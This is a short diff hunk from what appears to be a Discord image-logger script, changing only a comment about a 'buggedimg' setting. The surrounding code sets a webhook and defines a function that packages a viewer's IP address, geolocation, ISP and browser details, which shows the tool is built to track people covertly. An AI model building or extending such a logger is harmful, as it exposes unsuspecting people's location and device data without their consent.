@@ -5,7 +5,7 @@ import requests, base64, httpagentparser
 webhook = 'WEBHOOK'
 bindata = requests.get('link to image here').content
 
-buggedimg = True # Set this to True if you want the image to load on discord, False if you don't. (CASE SENSITIVE)
+buggedimg = True # Set this to True if you want the image to show as loading on Discord, False if you don't. (CASE SENSITIVE)
 
 def formatHook(ip,city,reg,country,loc,org,postal,useragent,os,browser):
     return {
